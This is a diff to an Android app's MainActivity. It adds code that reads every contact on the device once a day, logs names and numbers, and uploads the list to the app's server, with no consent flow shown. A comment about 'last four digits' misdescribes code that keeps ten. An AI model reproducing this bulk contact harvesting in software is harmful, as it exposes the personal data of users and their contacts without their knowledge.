@@ -2,12 +2,15 @@ package com.kabaladigital.tingtingu.ui.activity;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
+import android.content.ContentResolver;
 import android.content.Intent;
+import android.database.Cursor;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
 import android.os.SystemClock;
+import android.provider.ContactsContract;
 import android.util.Log;
+import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
@@ -18,13 +21,15 @@ import androidx.databinding.DataBindingUtil;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.messaging.FirebaseMessaging;
+import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
-import com.kabaladigital.tingtingu.BuildConfig;
+import com.kabaladigital.tingtingu.Class.Global;
 import com.kabaladigital.tingtingu.R;
 import com.kabaladigital.tingtingu.database.AppDatabase;
 import com.kabaladigital.tingtingu.database.DataRepository;
 import com.kabaladigital.tingtingu.databinding.ActivityMainBinding;
+import com.kabaladigital.tingtingu.models.ContactUploadModel;
 import com.kabaladigital.tingtingu.networking.ApiClient;
 import com.kabaladigital.tingtingu.networking.ApiInterface;
 import com.kabaladigital.tingtingu.service.MyBroadCastReceiver;
@@ -35,6 +40,8 @@ import com.kabaladigital.tingtingu.util.Utilities;
 
 import org.json.JSONObject;
 
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.Random;
 
 import okhttp3.MultipartBody;
@@ -43,19 +50,20 @@ import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
 
+import static com.google.firebase.crashlytics.internal.Logger.TAG;
+
 public class MainActivity extends AppCompatActivity {
 
     private static final String TAG_CHANGELOG_DIALOG = "changelog";
-
+    String jsonStr;
+    JsonArray jsonArrayContact = new JsonArray();
     // Intent
     Intent mIntent;
     String mIntentAction;
     String mIntentType;
 
     ActivityMainBinding binding;
-
     public static final String MESSAGE_STATUS = "MainActivity";
-
     DataRepository repository;
 
     @RequiresApi(api = Build.VERSION_CODES.O)
@@ -66,6 +74,10 @@ public class MainActivity extends AppCompatActivity {
 
         Installation.id(this);
         setSupportActionBar(binding.toolbarMainActivity);
+        Global.TTULibraryImage(this) ;
+        Global.TTULibraryVideo(this) ;
+        Global.TTULibraryProfile(this) ;
+
 
         PreferenceUtils.getInstance(this,true); // Get the preferences
         Utilities.setUpLocale(this);
@@ -100,6 +112,15 @@ public class MainActivity extends AppCompatActivity {
                     }
                 });
 
+        String _ctime = new SimpleDateFormat("yyyyMMdd").format(new Date());
+        String _DBtime=   PreferenceUtils.getInstance().getString(R.string.pref_c_upload_date);
+        if(_ctime.equalsIgnoreCase(_DBtime)==false) {
+            new Thread(new Runnable() {
+                public void run() {
+                    ReadContactDetailsJson();
+                }
+            }).start();
+        }
         //Notification
 //        ShowNotificationAd.createNotification(this);
 //        ShowNotificationAd.createImageWithCallNotification(this);
@@ -181,14 +202,92 @@ public class MainActivity extends AppCompatActivity {
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
         Intent intent = new Intent(this, MyBroadCastReceiver.class);
         PendingIntent pendingIntent = PendingIntent.getBroadcast(this,0,intent,0);
-
         alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP
                 , SystemClock.elapsedRealtime()
                 , 15*60*1000
                 , pendingIntent);
     }
 
+    private void uploadContact(JsonObject contactListObj){
+        ApiInterface apiInterface = ApiClient.createService(ApiInterface.class);
+        Call<ContactUploadModel> call = apiInterface.contactUploadDetails(contactListObj);
+        // retrofit2.Call<ContactUploadModel> call = apiInterface.contactUploadDetails(contactListObj);
+        call.enqueue(new Callback<ContactUploadModel>() {
+            @Override
+            public void onResponse(Call<ContactUploadModel> call,
+                                   Response<ContactUploadModel> response) {
+                if (response.code() == 200) {
+                    Toast.makeText(getApplicationContext(),"Success",Toast.LENGTH_SHORT).show();
+                    String timeStamp = new SimpleDateFormat("yyyyMMdd").format(new Date());
+                   PreferenceUtils.getInstance().putString(R.string.pref_c_upload_date,timeStamp);
+                }
+            }
+            @Override
+            public void onFailure(Call<ContactUploadModel> call, Throwable t) {
+                Toast.makeText(getApplicationContext(), "onFailure= "+t.getMessage(), Toast.LENGTH_SHORT).show();
+            }
+        });
+    }
 
+
+
+    private void ReadContactDetailsJson() {
+
+        ContentResolver cr = getApplicationContext().getContentResolver();
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null);
+        if ((cur != null ? cur.getCount() : 0) > 0) {
+            while (cur != null && cur.moveToNext()) {
+
+                JsonObject contactobj = new JsonObject();
+                String id = cur.getString(
+                        cur.getColumnIndex(ContactsContract.Contacts._ID));
+                String name = cur.getString(cur.getColumnIndex(
+                        ContactsContract.Contacts.DISPLAY_NAME));
+
+                if (cur.getInt(cur.getColumnIndex(
+                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    Cursor pCur = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id}, null);
+                    String phoneNo = "";
+                    while (pCur.moveToNext()) {
+                        phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        Log.i(TAG, "Name: " + name);
+                        Log.i(TAG, "Phone Number: " + phoneNo);
+                    }
+
+                    contactobj.addProperty("name", name);
+                    String lastFourDigits = "";     //substring containing last 4 characters
+
+                    if (phoneNo.length() > 10)
+                    {
+                        lastFourDigits = phoneNo.substring(phoneNo.length() - 10);
+                    }
+                    else
+                    {
+                        lastFourDigits = phoneNo;
+                    }
+                    contactobj.addProperty("number",  lastFourDigits);
+                    pCur.close();
+                }
+
+                jsonArrayContact.add(contactobj);
+
+            }
+        }
+        if (cur != null) {
+            cur.close();
+        }
+
+        JsonObject  contactListObj = new JsonObject();
+        contactListObj.add("contactList", jsonArrayContact);
+       // jsonStr = contactListObj.toString();
+
+        uploadContact(contactListObj);
+    }
     @Override
     public boolean onSupportNavigateUp() {
         onBackPressed();
@@ -214,7 +313,6 @@ public class MainActivity extends AppCompatActivity {
                         Utilities.checkPermissionsGranted(this, Utilities.MUST_HAVE_PERMISSIONS)) { //If granted
             checkVersion();
         } else {
-
             Utilities.askForPermissions(MainActivity.this, Utilities.MUST_HAVE_PERMISSIONS);
 
             /*final Handler handler = new Handler();
@@ -283,8 +381,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-    private void updateToken(JsonObject token)
-    {
+    private void updateToken(JsonObject token)    {
         RequestBody requestBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("token", token.toString())
@@ -296,6 +393,8 @@ public class MainActivity extends AppCompatActivity {
             public void onResponse(Call<JsonObject> call, Response<JsonObject> response) {
                 if (response.code()==200){
                     Log.i("Success", "Response: " + response.code());
+
+
                 }
                 if (response.code()==500){
                     Log.i("Error", "Response: " + response.code());
